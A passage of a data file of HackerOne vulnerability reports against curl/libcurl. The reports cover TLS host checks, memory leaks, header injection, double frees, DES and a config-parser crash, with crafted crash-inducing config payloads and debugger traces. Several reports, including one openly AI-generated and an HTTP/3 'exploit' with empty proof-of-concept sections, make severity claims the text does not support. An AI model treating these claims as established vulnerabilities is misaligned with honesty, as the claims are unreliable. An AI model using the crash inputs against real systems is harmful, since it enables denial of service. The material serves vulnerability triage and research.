    "original_report": "Summary:\n--------\n\nWhen using WolfSSL as the TLS backend, there is an issue where the CN or SAN in the certificate is not verified when connecting to an IP address over HTTP/3.\n\nwolfSSL\\_X509\\_check\\_host is only called when `peer->sni` is not NULL.\nHowever, when an IP address is specified, `peer->sni` is NULL, so the verification does not occur.\n\nCurl\\_vquic\\_tls\\_verify\\_peer()\n\nAffected version\n----------------\n\nSteps To Reproduce:\n-------------------\n\nI will explain using a connection to google.com as an example.\n\n1. Prepare curl with WolfSSL backend.\n2. To resolve the domain name google.com and obtain its IP address for testing purposes(142.251.222.14).\n3. curl --http3 <https://142.251.222.14>\n\nWhen an IP address is specified, it should result in an error during CN/SAN verification, but no error occurs.\nAn error occurs when using HTTP/1.1.\n\nAn error occurs when the TLS backend is OpenSSL.\n\nImpact\n------\n\n[CWE-297](/hacktivity/cwe_discovery?id=cwe-297): Improper Validation of Certificate with Host Mismatch"
},
{
    "url": "https://hackerone.com/reports/3158093",
    "original_report": "Summary:\n--------\n\nThis report details a memory leak vulnerability in libcurl that occurs when processing HTTP 3xx redirect responses containing a `Location:` header. Specifically, the memory allocated for the `Location:` header's value is not properly deallocated when the `Curl_easy` handle is reused for subsequent requests (e.g., when following redirects or in long-running applications that frequently reuse handles). This leads to a gradual increase in memory consumption, potentially resulting in a Denial of Service (DoS) due to resource exhaustion.\n\n### Statement clarifying if an AI was used to find the issue or generate the report:\n\nThis report was generated with the assistance of an AI. The vulnerability was identified through a combination of manual code analysis and AI-assisted debugging and proof-of-concept generation.\n\nAffected version:\n-----------------\n\ncurl/libcurl version: **8.14.0-DEV** (Built from source on 2025-05-22)\nPlatform: **Kali Linux (x86\\_64)**\n\nYou can obtain your exact version information using:\n\n**Steps To Reproduce**:\n**Set up the testing environment**:\n**Install necessary dependencies**:\n\n**Clone the curl repository**:\n\n**Build curl with debug symbols**:\n\n**Prepare the malicious HTTP server (Python PoC server)**:\n**Create a Python script named leak\\_server.py in the root of the curl directory**:\n\n**Paste the following Python code into leak\\_server.py**:\n\n**Run the malicious HTTP server**:\nOpen a new terminal (keep it separate).\nNavigate to the curl root directory:\n\nStart the server in the background, redirecting its output to server.log:\n\nExecute curl to trigger the memory leak using Valgrind:\nOpen a new terminal (keep it separate from the server's terminal).\nNavigate to the curl root directory:\n\nRun your custom-built curl binary with Valgrind, following the redirects:\n\n*This command will execute curl, forcing it to follow up to 1000 redirects from the Python server, each with a long Location: header. Valgrind will monitor memory allocations and deallocations. This process might take a few minutes. Wait for the valgrind command to complete (your terminal prompt will reappear).*\n\n**Analyze the results**:\nView the Valgrind report:\n\n*(Note: While Valgrind's definitely lost summary might show 0 bytes due to subtle internal cleanup or program termination characteristics, the core of this vulnerability is revealed through code analysis as described below.)*\n\nView the server log:\n\n*(You should see many Received request for: and Redirecting to: lines, confirming curl followed the redirects.)*\n\n**Supporting Material/References**:\n\n*Valgrind valgrind\\_report.txt (output from step 5)*\n*Python server server.log (output from step 5)*\n*Affected source code files: lib/http.c, lib/request.c*\n\nImpact\n------\n\nSummary:\n--------\n\nThis memory leak vulnerability allows an attacker to progressively consume memory on a system running an application that uses libcurl to follow HTTP redirects. By crafting a series of HTTP 3xx responses with specially designed (e.g., very long) `Location:` headers, a malicious server can cause the client-side application using libcurl to continuously allocate memory without proper deallocation.\n\n### Specifics:\n\n* **Resource Exhaustion (Denial of Service):** In long-running services or applications that frequently handle HTTP redirects or reuse `Curl_easy` handles over many requests, this continuous memory accumulation can lead to the application consuming excessive amounts of RAM. Eventually, this could exhaust available system memory, causing the application to crash, become unstable, or trigger system-wide performance degradation, effectively leading to a Denial of Service.\n* **Attacker Control:** The attacker has control over the length of the leaked string (the `Location:` header value), allowing them to influence the rate of memory consumption. While standard HTTP header size limits exist, even within these limits, repeatedly leaking memory can be impactful over time.\n* **Scope of Impact:** Affects clients that use libcurl, not the server-side infrastructure of `curl`.\n\n### Technical Details of the Leak:\n\nThe memory leak stems from the handling of the `location` pointer within the `struct SingleRequest` (defined in `lib/request.h`).\n\n1. **Allocation:** In `lib/http.c`, within the `http_header()` function (around line 2342 in version 8.14.0-DEV), when a `Location:` header is received, its value is duplicated and stored: `data->req.location = location;` (where `location` is dynamically allocated via `Curl_copy_header_value` which uses `Curl_memdup0`, similar to `strdup`).\n2. **Missing Deallocation:** In `lib/request.c`, the `Curl_req_hard_reset()` function (around line 100), which is called to reset the request state (e.g., before following a redirect or when preparing for a new request), sets `req->location = NULL;`. **Crucially, it does not free the memory previously pointed to by `req->location` before nullifying the pointer.**\n3. **Persistence:** The `Curl_req_free()` function (also in `lib/request.c`), responsible for freeing the `SingleRequest` structure, also does not explicitly free `req->location`.\n\nThis chain of events ensures that for every redirect `curl` follows (or for every `Curl_easy` handle reused after a redirect), the memory allocated for the `Location:` header of the *previous* redirect is leaked."
},
{
    "url": "https://hackerone.com/reports/3148937",
    "original_report": "In `Curl_socketpair()` in `curl/lib/socketpair.c` if the operating system lacks a native `socketpair()` function, libcurl will create its own pair of sockets. To do this, libcurl first creates a listening socket, then it creates a client socket, which it then connects to the listening socket. During the time between when the listening socket is bound and set to listen, and when the client socket tries to connect, there is a gap where any process could connect to the listening socket first. As this is an obvious invitation to a man-in-the-middle attack, libcurl generates a 9 byte secret which it writes out of the listening socket, and then subsequently reads the secret back from the client socket for verification.\n\nThis approach is still vulnerable to both a man-in-the-middle attack. It is easy for a user to monitor for new TCP listening sockets on the localhost interface, and it is possible for another user to connect first to the listening socket. Once connected, the attacker could simply send 9 random bytes. While the probability of successfully guessing the generated secret is low, it is not zero. Furthermore, if curl is compiled without SSL, the curl random number generator will fall back to a low entropy mode based on the system clock, and secrets generated while in this mode would be much easier to guess. In `curl/lib/rand.c`\n\nAlso, any user on a system with the capability to capture network traffic on the localhost interface can read the generated 9 byte secret, and then inject the secret into their own connection to the server socket. While non-privileged users do not always have capture permissions, it is not unheard of, particularly in shared computer environments. Yes, this would imply that the attacker would have access to all data sent over the socket pair anyway, but that data could be encrypted at a higher level, whereas the 9 byte secret is essentially sent as plaintext. Here is a screenshot of an interception, with the 9 byte secret highlighted.\n\nSimilar Issue\n-------------\n\n[CVE-2024-3219](/hacktivity/cve_discovery?id=CVE-2024-3219)\n<https://nvd.nist.gov/vuln/detail/CVE-2024-3219>\n<https://github.com/python/cpython/issues/122133>\n\nSuggested fix\n-------------\n\nInstead of generating, sending, and receiving a sequence of random bytes, I recommend following the example of Python by comparing the TCP ports of both sockets. As the sockets are both on the same localhost interface, matching the TCP ports will guarantee the socket equivalence. This also obviates any concern about the random number generator. In the code below, the port numbers are in network-byte order, but for the purposes of comparison that is irrelevant.\n\nImpact\n------\n\nAny user on a system using a version of libcurl built without native `socketpair()` support can attempt to impersonate libcurl by hijacking the socket pair creation."
},
{
    "url": "https://hackerone.com/reports/3137657",
    "original_report": "* in getparameter() via strdup() in tool\\_getparam.c > SIGSEGV\n  Project: cURL\n  File: src/tool\\_getparam.c\n  Function: getparameter() → indirectly via getstr()\n  Detected By: AddressSanitizer (ASan)\n  Command Used:\n\nASAN\\_OPTIONS=\"detect\\_leaks=1:verbosity=2:malloc\\_context\\_size=50\" ./curl -K <crash-file>\n\nOverview\n========\n\nA memory leak vulnerability has been identified in Curl’s configuration handling within tool\\_getparam.c. The issue originates from improper memory management of dynamically allocated strings using strdup(), leading to a persistent allocation that is never freed. Leak occurs in a key parsing function that processes user input, and survives until program termination, violating memory safety expectations for clean exits or tools used in pipelines and fuzzing environments. The issue lies in allocations made for fields like config->range, config->useragent, etc., without corresponding calls to free() or a cleanup routine.\nAffected Component\n\n* File: tool\\_getparam.c\n* Function: getstr()\n* Location: Line 2754\n* Bug Type: Memory Leak\n* Impact: The persistent allocation results in uncontrolled heap growth. While a memory leak alone does not directly enable arbitrary code execution, further analysis is required to assess whether heap fragmentation or manipulation could lead to memory corruption scenarios.\n\nTechnical Details\n-----------------\n\nIssue Description\nThe function getstr() is responsible for handling dynamically allocated strings used for various Curl parameters. If an existing string pointer is assigned a new value, it is properly freed before reallocation:\nstatic ParameterError getstr(char \\**str, const char* val, bool allowblank)\n{\nif(*str) {\nfree(*str);\n\\*str = NULL;\n}\n\nHowever, when val is provided, strdup() is used to duplicate the string without ensuring proper memory cleanup later:\nif(val) {\nif(!allowblank && !val[0])\nreturn PARAM\\_BLANK\\_STRING;\n\n*str = strdup(val); // Potential leak occurs here\nif(!*str)\nreturn PARAM\\_NO\\_MEM;\n}\nreturn PARAM\\_OK;\n}\n\nSince there is no corresponding free() before process termination, this leads to a direct memory leak, as confirmed by ASAN:\n7796ERROR: LeakSanitizer: detected memory leaks\n\nDirect leak of 2 byte(s) in 1 object(s) allocated from:\n[#0](/reports/0) 0x55fa1dc2f19e in strdup (/home/og/test/afl-test/curl/build/src/curl+0xdf19e)\n[#1](/reports/1) 0x55fa1dca3e21 in getparameter /home/og/test/afl-test/curl/src/tool\\_getparam.c:2754\n[#2](/reports/2) 0x55fa1dce687b in parseconfig /home/og/test/afl-test/curl/src/tool\\_parsecfg.c:175\n\nControl Flow Analysis\nThe memory allocation propagates through several functions, increasing impact:\ngetparameter() → parseconfig() → parse\\_args() → operate() → main()\n\nThis suggests that user-provided configuration values influence the strdup() call, meaning an attacker might manipulate inputs to generate excessive heap allocations.\n\nSanitizer Output (Summary)\n\n7796ERROR: LeakSanitizer: detected memory leaks\n\nDirect leak of 2 byte(s) in 1 object(s) allocated from:\n[#0](/reports/0) 0x55fa1dc2f19e in strdup\n[#1](/reports/1) 0x55fa1dca3e21 in getparameter /curl/src/tool\\_getparam.c:2754:35\n[#2](/reports/2) 0x55fa1dce687b in parseconfig /curl/src/tool\\_parsecfg.c:175:13\n[#3](/reports/3) 0x55fa1dca7c03 in getparameter /curl/src/tool\\_getparam.c:2793:10\n...\nSUMMARY: AddressSanitizer: 2 byte(s) leaked in 1 allocation(s).\n\nRoot Cause\n----------\n\nThe function getstr() is used to safely copy a string into a heap-allocated buffer, freeing any previous value:\n\nstatic ParameterError getstr(char \\**str, const char* val, bool allowblank)\n{\nif(*str) {\nfree(*str);\n\\*str = NULL;\n}\nif(val) {\nif(!allowblank && !val[0])\nreturn PARAM\\_BLANK\\_STRING;\n\n*str = strdup(val); // <-- Allocation not freed later\nif(!*str)\nreturn PARAM\\_NO\\_MEM;\n}\nreturn PARAM\\_OK;\n}\n\nThe call site inside getparameter() likely sets \\*str (e.g. config->range or another config field) but the value is never freed at the end of execution or between subsequent calls, especially in a fuzzing or crashing scenario.\n\n* Execution Flow:\n  getparameter() → parseconfig() → parse\\_args() → operate() → main()\n\nImpact\n------\n\nCauses memory leaks on malformed or crafted config files (especially during fuzzing).\n\nAffects test reliability and resource handling.\n\nMay mask deeper issues or confuse fuzzers due to retained allocations.\n\n* The allocation remains in memory until exit, resulting in a direct memory leak."
},
{
    "url": "https://hackerone.com/reports/3133379",
    "original_report": "Hello Team,\n\nThere is a bug in `curl` where a user can inject **new HTTP headers** into a proxy request by using special characters in the `--proxy-header` option.\n\nThis is done by adding `\\r\\n` (carriage return + line feed) inside the header value. This breaks the HTTP format and lets the user create more headers from a single line\n\nWhat’s the Problem?\n===================\n\nThe problem happens because `curl` **does not check** for `\\r` or `\\n` in the input. So if a user puts:\n\nThe proxy sees **two headers**:\n\nThis is **not supposed to happen**\n\nHow the Code Works (with file paths and lines)\n==============================================\n\nHere’s how `curl` processes the `--proxy-header` input:\n\nMain Function\n-------------\n\n`src/tool_main.c` line 238\n\nEntry point of the program:\n\nCalling `operate()`\n-------------------\n\n`src/tool_main.c` line 284\n\nCLI Parsing\n-----------\n\n`src/tool_operate.c`, line 3186\n\nHandling `--proxy-header`\n-------------------------\n\n`src/tool_getparam.c` line 2766\n\nPassing the value\n-----------------\n\n`src/tool_getparam.c`, line 1281\n\nNo Filtering Happens\n--------------------\n\n`src/tool_paramhlp.c`, line 614–615\n\nAt this point, the raw input (even if it includes \\r\\n) is passed as-is to `curl_slist_append()`, and then into the final HTTP request\n\nThere is no check to block newline injection\n\nProof of Concept\n================\n\n# 1. Start a fake proxy listener:\n\n# 2. Run curl with a payload header:\n\nAttachment:\n\n# 3. Netcat output:\n\nIt proves that one CLI input caused **two** headers\n\nAttachment:\n\nSuggested Fix\n-------------\n\nIn this file:\n\n`src/tool_paramhlp.c`, inside `add2list()`, around line **615**:\n\nAdd a simple check:\n\nThis will block all `\\r` or `\\n` inside header input.\n\nImpact\n------\n\nThis bug allows the user to inject raw HTTP headers into proxy requests.\n\nBy using a single command-line input, a user can add multiple headers.This breaks the normal HTTP format and can be used to:\n\nBypass security filters (WAF, proxy rules)\n\nInject spoofed headers like X-Forwarded-For, Authorization\n\nPoison logs on the proxy\n\nBug is easy to test\n\nThe issue is real and affects live network traffic\n\nSimilar bugs in other tools got CVEs\n\nTested on `curl 8.13.0` (May 2025), on Kali Linux\n\nThanks for reviewing. Let me know if you need help verifying the fix"
},
{
    "url": "https://hackerone.com/reports/3125832",
    "original_report": "**Penetration Testing Report: HTTP/3 Stream Dependency Cycle Exploit**\n\n---\n\n**0x00 Overview**\n=================\n\nA novel exploit leveraging stream dependency cycles in the HTTP/3 protocol stack was discovered, resulting in memory corruption and potential denial-of-service or remote code execution scenarios when used against HTTP/3-capable clients such as `curl` (tested on version 8.13.0). This report details a practical proof of concept, required environment setup, attack execution, and crash analysis.\n\n---\n\n**0x01 Environment Setup**\n==========================\n\n**1. Malicious Server Setup (aioquic modified)**\n------------------------------------------------\n\n---\n\n**0x02 Proof-of-Concept Code**\n==============================\n\n**1. Malicious HTTP/3 Server (exploit\\_server.py)**\n---------------------------------------------------\n\n**2. Launch Script (launch\\_attack.sh)**\n----------------------------------------\n\n---\n\n**0x03 Crash Analysis Guide**\n=============================\n\n**1. Reproducing the Crash**\n----------------------------\n\n**2. Debugging with GDB**\n-------------------------\n\n**Expected Output:**\n\nInspect registers and stack:\n\nSigns of memory overwrite:\n\n* r15 shows `0x4141414141414141`\n* Recursive calls to same handler\n\n---\n\n**0x04 Memory Corruption Evidence**\n===================================\n\n**Core Dump Inspection**\n------------------------\n\nAnalysis shows:\n\n* Return address overwritten\n* Stack recursion at `ngtcp2_http3_handle_priority_frame`\n\n---\n\n**0x05 Detection and Defense**\n==============================\n\n**1. Suricata Rule for Detection**\n----------------------------------\n\n**2. Client Hardening Recommendations**\n---------------------------------------\n\n* Enforce acyclic stream dependency validation.\n* Patch HTTP/3 parsers to cap `priority_update` depth.\n* Reject bidirectional dependencies in QUIC priority logic.\n\n---\n\n**0x06 Risk Summary**\n=====================\n\n* Affected Software: curl 8.13.0 (HTTP/3 enabled)\n* Trigger: Stream dependency loop (e.g., stream 3 depends on 7, and 7 depends on 3)\n* Result: Heap layout corruption, segmentation fault, denial-of-service\n* Risk: High (pre-authentication, remote-triggerable)\n\n---\n\n**Prepared by:**\n\nDate: 2025-05-04\n\nImpact\n------\n\nSummary:\n--------\n\n1"
},
{
    "url": "https://hackerone.com/reports/3117697",
    "original_report": "Description:\n------------\n\nTwo **Double Free** vulnerabilities have been identified in the `cookie.c` file of the `libcurl` library. These issues occur due to improper memory management, where the same memory area is freed multiple times under certain conditions. Below are clear steps to reproduce each vulnerability.\n\n---\n\n### Summary:\n\nThe vulnerabilities occur in the following scenarios:\n\n1. **`replace_existing` Function**: A cookie object is freed without ensuring it has not already been removed from the list, leading to double-free.\n2. **`Curl_cookie_add` Function**: On errors, memory allocated for a cookie object is freed again, even if it was previously released.\n\nSteps To Reproduce:\n-------------------\n\n### Case 1: Vulnerability in `replace_existing` Function\n\n1. Create multiple cookies with identical names, domains, and paths.\n2. Trigger a scenario where an existing cookie needs to be replaced (e.g., by adding a new cookie with the same attributes).\n3. Observe the program crash or unexpected behavior due to double-free in the following code:\n\n### Case 2: Vulnerability in `Curl_cookie_add` Function\n\n1. Add a malformed or invalid cookie header line to the cookie input file.\n2. Ensure the program encounters an error during cookie parsing.\n3. Observe the program crash or unexpected behavior due to double-free in the following code:\n\n---\n\nImpact\n------\n\n### Summary\n\nThe **Double Free** vulnerabilities in `libcurl` can have severe security implications:\n\n1. **Program Crash**: A double-free leads to undefined behavior, often resulting in segmentation faults.\n2. **Arbitrary Code Execution**: Attackers could exploit this issue to execute arbitrary code in the context of the vulnerable program.\n3. **Data Integrity**: Memory corruption caused by this vulnerability can lead to data leakage or integrity issues, compromising the application's reliability.\n4. **Denial of Service (DoS)**: Exploiting this vulnerability could result in a denial-of-service condition.\n\nThese vulnerabilities can be exploited by attackers to compromise the security and stability of any applications or systems using `libcurl`.\n\n---"
},
{
    "url": "https://hackerone.com/reports/3116935",
    "original_report": "Summary:\n--------\n\nThe DES cipher (Data Encryption Standard) is used in the `curl_ntlm_core.c` file of libcurl. DES is considered insecure due to its short key length (56 bits) and its susceptibility to brute-force attacks. Modern cryptographic standards recommend replacing DES with AES (Advanced Encryption Standard), which is more robust and secure.\n\nAffected version\n----------------\n\n[Which curl/libcurl version are you using to reproduce? On which platform? `curl -V` typically generates good output to include]\n\nSteps To Reproduce:\n-------------------\n\n1. Inspect the `lib/curl_ntlm_core.c` file of the libcurl source code.\n2. Locate the use of the `kCCAlgorithmDES` constant, which corresponds to the DES cipher.\n3. Verify that DES is being used for cryptographic operations in NTLM authentication (NTLMv1).\n   ## Supporting Material/References:\n\n* File: `lib/curl_ntlm_core.c`\n* Line Reference: 228:29\n* CWE Reference: [CWE-327](https://cwe.mitre.org/data/definitions/327.html)\n\n  + [attachment / reference]\n\nImpact\n------\n\nSummary:\n--------\n\nUsing DES compromises the security of the application due to the following points:\n\n* **Brute-force attacks**: The short key length makes it possible to brute-force DES keys in a reasonable amount of time with modern hardware.\n* **Cryptographic weaknesses**: DES is vulnerable to various cryptanalysis techniques, such as differential and linear cryptanalysis.\n* **Compliance risks**: DES does not meet modern cryptographic standards and could lead to non-compliance with security regulations.\n\nAn attacker exploiting this vulnerability could:\n\n* Intercept and decrypt sensitive data during NTLM authentication.\n* Execute man-in-the-middle (MITM) attacks to impersonate a user or server.\n* Gain unauthorized access to systems relying on NTLM authentication.\n\n---\n\nRecommended Fix:\n----------------\n\nReplace the use of `kCCAlgorithmDES` with `kCCAlgorithmAES`, which supports stronger encryption standards (e.g., AES-128, AES-256). This change will significantly enhance the security of NTLM authentication in libcurl."
},
{
    "url": "https://hackerone.com/reports/3094406",
    "original_report": "Summary:\n--------\n\nA heap‑based buffer overflow in curl’s config‑file parser (`parseconfig()` --> `getparameter()`) allows an attacker supplying a crafted config file to overwrite internal pointers (via `cleanarg()`), leading to a write‑what‑where primitive and potential remote code execution.\n\nAffected version\n----------------\n\n-curl 8.13.0 (x86\\_64-pc-linux-gnu) libcurl/8.13.0 OpenSSL/3.0.13 libpsl/0.21.2\nRelease-Date: 2025-04-02\n\n* or any Version after version 8.13.0 (dev-versions) that include `cleanarg()` and have writable argv support\n\nSteps To Reproduce:\n-------------------\n\n* tested on both Ubuntu 24.04.1 [Linux bobo-pc-1701 6.11.0-21-generic #21~24.04.1-Ubuntu ] AND\n  Kali 6.11.2-1kali1 [Linux kali 6.11.2-amd64]\n\n1. Download the last release from github and unizp it:\n   wget <https://github.com/curl/curl/releases/download/curl-8_13_0/curl-8.13.0.zip> && unzip curl-8.13.0.zip && cd curl-8.13.0\n2. Build and install:\n   ./configure --with-openssl\n   make all && sudo make install\n   curl --version\n3. -The crash could be caused by crafted config file that contains one of this payloads;\n   -> It could be appended anywhere in new line in config-file;\n   -> All the inputs lead to one crash path.\n\n   echo -ne \"-vvvuAAAA\" > malicious\\_config\\_file1.conf (u for --user <user:password> )\n   echo -ne \"-vvvUAAAA\" > malicious\\_config\\_file2.conf (U for --proxy-user <user:password> )\n   echo -ne \"-vvvEAAAA\" > malicious\\_config\\_file3.conf (E for --cert <certificate[:password]> )\n4. curl -K malicious\\_config\\_file1.conf  \n   zsh: segmentation fault curl -K malicious\\_config\\_file1.conf\n   ---------------- Or ------------------\n   curl -K malicious\\_config\\_file2.conf\n   zsh: segmentation fault curl -K malicious\\_config\\_file2.conf\n   ---------------- Or ------------------\n   curl -K malicious\\_config\\_file3.conf\n   zsh: segmentation fault curl -K malicious\\_config\\_file3.conf\n\n   > > sudo dmesg |tail -n 6\n\n   [176771.791272] curl[132987]: segfault at 5 ip 00007f3a8db8b75d sp 00007ffd419fd958 error 4 in libc.so.6[18b75d,7f3a8da28000+188000] likely on CPU 3 (core 3, socket 0)\n   [176771.791357] Code: 00 00 66 2e 0f 1f 84 00 00 00 00 00 90 f3 0f 1e fa 89 f8 48 89 fa c5 f9 ef c0 25 ff 0f 00 00 3d e0 0f 00 00 0f 87 33 01 00 00 <c5> fd 74 0f c5 fd d7 c1 85 c0 74 57 f3 0f bc c0 c5 f8 77 c3 66 66\n\n   [176778.655937] curl[132996]: segfault at 5 ip 0000792ad5f8b75d sp 00007fff028cfc18 error 4 in libc.so.6[18b75d,792ad5e28000+188000] likely on CPU 6 (core 2, socket 1)\n   [176778.656011] Code: 00 00 66 2e 0f 1f 84 00 00 00 00 00 90 f3 0f 1e fa 89 f8 48 89 fa c5 f9 ef c0 25 ff 0f 00 00 3d e0 0f 00 00 0f 87 33 01 00 00 <c5> fd 74 0f c5 fd d7 c1 85 c0 74 57 f3 0f bc c0 c5 f8 77 c3 66 66\n\n   [176783.987409] curl[133003]: segfault at 5 ip 000079c33cd8b75d sp 00007ffe06464158 error 4 in libc.so.6[18b75d,79c33cc28000+188000] likely on CPU 0 (core 0, socket 0)\n   [176783.987474] Code: 00 00 66 2e 0f 1f 84 00 00 00 00 00 90 f3 0f 1e fa 89 f8 48 89 fa c5 f9 ef c0 25 ff 0f 00 00 3d e0 0f 00 00 0f 87 33 01 00 00 <c5> fd 74 0f c5 fd d7 c1 85 c0 74 57 f3 0f bc c0 c5 f8 77 c3 66 66\n\nTriaging the crash:\n-------------------\n\n1.To triage this we need to build with extra flags:\n\n> > CFLAGS=\"-fsanitize=address,undefined -g -O0 -fno-omit-frame-pointer\" ./configure --with-openssl  \n> > make all && sudo make install\n\n2.Run curl :\n------------------------------------- Asan output ----------------------------------\npc[@pc22](/pc22):~/Downloads$ curl -K malicious\\_config\\_file1.conf\nAddressSanitizer:DEADLYSIGNAL\n\n---\n\n140300ERROR: AddressSanitizer: SEGV on unknown address 0x000000000005 (pc 0x72133b58b75d bp 0x7ffe1b2c0b20 sp 0x7ffe1b2c02a8 T0)\n140300The signal is caused by a READ memory access.\n140300Hint: address points to the zero page.\n[#0](/reports/0) 0x72133b58b75d in \\_\\_strlen\\_avx2 ../sysdeps/x86\\_64/multiarch/strlen-avx2.S:76\n[#1](/reports/1) 0x63e45d7996dc in cleanarg /home/bobo/Downloads/curl-8.13.0/src/tool\\_getparam.c:583\n[#2](/reports/2) 0x63e45d7b2d19 in getparameter /home/bobo/Downloads/curl-8.13.0/src/tool\\_getparam.c:2901\n[#3](/reports/3) 0x63e45d7b1ad8 in getparameter /home/bobo/Downloads/curl-8.13.0/src/tool\\_getparam.c:2790\n[#4](/reports/4) 0x63e45d7b4205 in parse\\_args /home/bobo/Downloads/curl-8.13.0/src/tool\\_getparam.c:3016\n[#5](/reports/5) 0x63e45d7b76ba in main /home/bobo/Downloads/curl-8.13.0/src/tool\\_main.c:284\n\nAddressSanitizer can not provide additional info.\nSUMMARY: AddressSanitizer: SEGV ../sysdeps/x86\\_64/multiarch/strlen-avx2.S:76 in \\_\\_strlen\\_avx2\n140300ABORTING\n\n* We can Also confirm the crash path using gdb (with GEF extension installed ):\n\n  > > gdb curl\n  > > (gef)> r -K malicious\\_config\\_file1.conf\n  > > (gef)> where\n  > > --------------------------------- gdb output ------------------------------------------------------\n  > > [#0](/reports/0) **strlen*avx2 () at ../sysdeps/x86\\_64/multiarch/strlen-avx2.S:76\n  > > [#1](/reports/1) 0x00007ffff787d827 in*** interceptor\\_strlen (s=0x5 <error: Cannot access memory at address 0x5>) at ../../../../src/libsanitizer/sanitizer\\_common/sanitizer\\_common\\_interceptors.inc:389\n  > > [#2](/reports/2) 0x00005555555926dd in cleanarg (str=0x5 <error: Cannot access memory at address 0x5>) at tool\\_getparam.c:583\n  > > [#3](/reports/3) 0x00005555555abd1a in getparameter (flag=0x50300000f281 \"vvvuAAAA\", nextarg=0x50300000f285 \"AAAA\", cleararg1=0x0, cleararg2=0x0, usedarg=0x7fffffffd79e, global=0x7ffff4300030,\n  > > config=0x51a000000080) at tool\\_getparam.c:2901\n  > > [#4](/reports/4) 0x00005555555b9434 in parseconfig ()\n  > > [#5](/reports/5) 0x00005555555aaad9 in getparameter (flag=0x7fffffffe1b8 \"K\", nextarg=0x7fffffffe1ba \"malicious\\_config\\_file1.conf\", cleararg1=0x7fffffffe1b7 \"-K\",\n  > > cleararg2=0x7fffffffe1ba \"malicious\\_config\\_file1.conf\", usedarg=0x7ffff4200030, global=0x7ffff4300030, config=0x51a000000080) at tool\\_getparam.c:2790\n  > > [#6](/reports/6) 0x00005555555ad206 in parse\\_args (global=0x7ffff4300030, argc=0x3, argv=0x7fffffffde48) at tool\\_getparam.c:3016\n  > > [#7](/reports/7) 0x00005555555b6a45 in operate ()\n  > > [#8](/reports/8) 0x00005555555b06bb in main (argc=0x3, argv=0x7fffffffde48) at tool\\_main.c:284\n  > > --------------------------------- Code ----------------------------------------------------------------------\n  > > 0x7ffff678b74d <**strlen\\_avx2+000d> and eax, 0xfff\n  > > 0x7ffff678b752 <**strlen\\_avx2+0012> cmp eax, 0xfe0\n  > > 0x7ffff678b757 <**strlen\\_avx2+0017> ja 0x7ffff678b890 <**strlen\\_avx2+336>\n  > > → 0x7ffff678b75d <**strlen\\_avx2+001d> vpcmpeqb ymm1, ymm0, YMMWORD PTR [rdi] // $rdi = 0x5 so unvalid address\n  > > 0x7ffff678b761 <**strlen\\_avx2+0021> vpmovmskb eax, ymm1\n  > > 0x7ffff678b765 <**strlen\\_avx2+0025> test eax, eax\n  > > 0x7ffff678b767 <**strlen\\_avx2+0027> je 0x7ffff678b7c0 <**strlen\\_avx2+128>\n  > > 0x7ffff678b769 <**strlen\\_avx2+0029> tzcnt eax, eax\n  > >\n  > > 0x7ffff678b76d <\\_\\_strlen\\_avx2+002d> vzeroupper\n  > > -------------------------------------------------\n  > >\n  > > + From the above output we can see that:\n  > >   1.the root cause of the crash is that strlen tried to load the data at invalid address (0x5), So it’s an invalid pointer dereference into unmapped memory.\n\n  2. ---\n\n     [#2](/reports/2) 0x00005555555926dd in cleanarg (str=0x5 <error: Cannot access memory at address 0x5>) at tool\\_getparam.c:583\n     [#3](/reports/3) 0x00005555555abd1a in getparameter (flag=0x50300000f281 \"vvvuAAAA\", nextarg=0x50300000f285 \"AAAA\", cleararg1=0x0, cleararg2=0x0, usedarg=0x7fffffffd79e, global=0x7ffff4300030,\n     config=0x51a000000080) at tool\\_getparam.c:2901\n\n     Moreever, we can see that the crash happened in `getparameter()` function tool\\_getparam.c:2901, which calls `cleanarg(clearthis)` with invalid address which passed to strlen.\n  3. In order to understand where is the invalid address come from , I set a breakpoint in gdb just before `cleanarg(clearthis)` in tool\\_getparam.c:2901 and tool\\_getparam.c:2900 ( - Not that for other options like --proxy-user [U] or --cert(E) you have to set breakpoints at different lines in tool\\_getparam.c )\n\n     see: <https://github.com/curl/curl/blob/master/src/tool_getparam.c#L2898-L2902>\n\n> > gdb curl\n> > (gef)> break tool\\_getparam.c:2900\n> > (gef)> break tool\\_getparam.c:2901\n> > (gef)> r -K malicious\\_config\\_file1.conf\n\n──────────────────────source:tool\\_getparam.c+2900 ───────────────\n\n────────────── threads ─────────────\n[#0] Id 1, Name: \"curl\", stopped 0x5555555abc83 in getparameter (), reason: BREAKPOINT\n────────────── trace ──────────────\n[#0] 0x5555555abc83 → getparameter(flag=0x50300000f281 \"vvvuAAAA\", nextarg=0x50300000f285 \"AAAA\", cleararg1=0x0, cleararg2=0x0, usedarg=0x7fffffffd79e, global=0x7ffff4300030, config=0x51a000000080)\n[#1] 0x5555555b9434 → parseconfig()\n[#2] 0x5555555aaad9 → getparameter(flag=0x7fffffffe1b9 \"K\", nextarg=0x7fffffffe1bb \"malicious\\_config\\_file1.conf\", cleararg1=0x7fffffffe1b8 \"-K\", cleararg2=0x7fffffffe1bb \"malicious\\_config\\_file1.conf\", usedarg=0x7ffff4200030, global=0x7ffff4300030, config=0x51a000000080)\n[#3] 0x5555555ad206 → parse\\_args(global=0x7ffff4300030, argc=0x3, argv=0x7fffffffde48)\n[#4] 0x5555555b6a45 → operate()\n[#5] 0x5555555b06bb → main(argc=0x3, argv=0x7fffffffde48)\n──────────────────────────────────────────────────────────────\n\n(gef)> p clearthis\n$1 = 0x5 <error: Cannot access memory at address 0x5>\n\n-> We hit at the first breakpoint and we confirmed that the clearthis value has been modified (invalid address)\n-> then we verified where the variable clearthis could be modified in the code (tool\\_getparam.c)\n\nSee: <https://github.com/curl/curl/blob/master/src/tool_getparam.c#L1787-L1798>\n\n-> Now we know that if the palfrom supports writable argv[], the clearthis is calculated with the following expression\n\n---> Clearthis = &cleararg1[parse + 2 - flag];\n\n(gef)> p &parse\n$12 = (const char \\*\\*) 0x7fffffffd5c0\n(gef)> p parse\n$13 = 0x50300000f284 \"uAAAA\"\n\n---\n\n(gef)> p &flag\n$14 = (const char \\*\\*) 0x7fffffffd5a8\n(gef)> p flag\n$15 = 0x50300000f281 \"vvvuAAAA\"\n\n---\n\n(gef)> p &cleararg1\n$16 = (char \\*\\*) 0x7fffffffd598\n(gef) = p cleararg1\n$17 = 0x0\n\n---\n\n(gef)> p parse+2-flag  \n$17 = 0x5 // 0x50300000f284 +2 - 0x50300000f281\n\n-> From the above output we can see that the value of clearthis is: (2 + the number of \"v\" letters [in our example ] = 0x5 ), which means that an attacker could partially control the what's written in [rdi] register which may lead to arbitrary read/write or code 